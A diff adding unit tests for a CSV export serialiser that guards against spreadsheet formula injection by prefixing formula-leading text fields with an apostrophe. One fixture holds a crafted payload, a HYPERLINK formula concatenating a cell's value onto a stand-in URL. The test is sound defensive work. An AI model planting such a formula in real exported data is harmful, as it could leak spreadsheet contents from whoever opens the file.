@@ -57,6 +57,35 @@ test('csv serialiser: signed amounts and RFC 4180 quoting', () => {
   assert.equal(exportFooter('csv', META), '');
 });
 
+// A description arrives from an imported bank file, so a crafted statement can
+// put a formula in one; opening the CSV in Excel or LibreOffice would run it.
+// The guard is a leading apostrophe on the TEXT columns only — date and amount
+// must stay raw, since a signed amount legitimately starts with '-'.
+test('csv serialiser: neutralises formula leads without touching amounts', () => {
+  const nasty = [
+    { id: 3, date: '2026-02-01', description: '=HYPERLINK("http://x/"&A1,"Receipt")',
+      amount: 12.5, notes: '@SUM(A1)', tx_type: 'expense', category_name: '+Rent' },
+    // A negative amount must NOT gain an apostrophe, or every importer that
+    // reads the file back breaks on the amount column.
+    { id: 4, date: '2026-02-02', description: 'PLAIN SHOP', amount: 8,
+      notes: '', tx_type: 'expense', category_name: null },
+  ];
+  const lines = exportBody('csv', nasty).split('\r\n').filter(Boolean);
+  assert.equal(lines[0],
+    '2026-02-01,"\'=HYPERLINK(""http://x/""&A1,""Receipt"")",expense,\'+Rent,-12.50,\'@SUM(A1)');
+  assert.equal(lines[1], '2026-02-02,PLAIN SHOP,expense,,-8.00,');
+});
+
+test('csv serialiser: leaves an ordinary leading apostrophe alone', () => {
+  // Only a formula LEAD is escaped, so a description that already starts with
+  // an apostrophe is not double-prefixed — which is what keeps the importer's
+  // unescape (strip one, only before a trigger char) lossless.
+  const rows = [{ id: 5, date: '2026-03-01', description: "'74 Camaro fund",
+    amount: 40, notes: '', tx_type: 'expense', category_name: null }];
+  const line = exportBody('csv', rows).split('\r\n')[0];
+  assert.equal(line, "2026-03-01,'74 Camaro fund,expense,,-40.00,");
+});
+
 test('qif serialiser: one ^-terminated record per row, US dates', () => {
   const out = exportHeader('qif', META) + exportBody('qif', SAMPLE);
   const lines = out.split('\r\n').filter(Boolean);
